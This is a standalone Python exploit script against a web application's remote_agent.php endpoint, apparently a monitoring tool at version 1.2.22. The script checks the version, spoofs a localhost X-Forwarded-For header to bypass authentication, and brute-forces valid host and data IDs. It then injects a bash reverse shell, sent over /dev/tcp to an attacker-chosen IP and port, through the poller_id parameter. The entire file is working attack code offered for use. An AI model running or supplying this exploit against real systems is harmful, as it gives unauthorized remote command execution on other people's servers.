import requests
import sys
import urllib.parse

if len(sys.argv) < 4:
    print("Usage: python3 exploit.py base_url ip port")
    sys.exit(1)

base_url = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]

response1 = requests.post(base_url)
content_of_response1 = response1.content.decode('utf-8')

if "1.2.22" in content_of_response1:
    print("[+] Version number seems like vulnerable")
else:
    print("[-] not Vulnerable")
    sys.exit(2)

found = False
valid_host_id = None
valid_local_data_id = None

for local_data_ids in range(1, 10):
    for host_id in range(1, 10):
        test_url = f"{base_url}/remote_agent.php?action=polldata&poller_id=1&host_id={host_id}&local_data_ids[]={local_data_ids}"
        header = {"X-Forwarded-For": "127.0.0.1"}

        try:
            response = requests.get(test_url, headers=header, timeout=3)
            if response.text != "[]" and response.status_code == 200:
                try:
                    data = response.json()
                    if data and "rrd_name" in data[0]:
                        rrd_name = data[0]["rrd_name"]
                        if rrd_name in ["polling_time", "uptime"]:
                            print(f"[+] founmd valid ids: host_id={host_id}, local_data_ids={local_data_ids}")
                            valid_host_id = host_id
                            valid_local_data_id = local_data_ids
                            found = True
                            break
                except:
                    pass
        except:
            pass

    if found:
        break

if not found:
    print("[-] Could not find valid IDs")
    sys.exit(1)

print(f"[*] send ereverse shell  to {ip}:{port}")
payload = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
encoded_payload = urllib.parse.quote(payload)

exploit_url = f"{base_url}/remote_agent.php?action=polldata&poller_id=;{encoded_payload}&host_id={valid_host_id}&local_data_ids[]={valid_local_data_id}"

try:
    requests.get(exploit_url, headers=header, timeout=3)
except:
    print("[+] Payload sent")
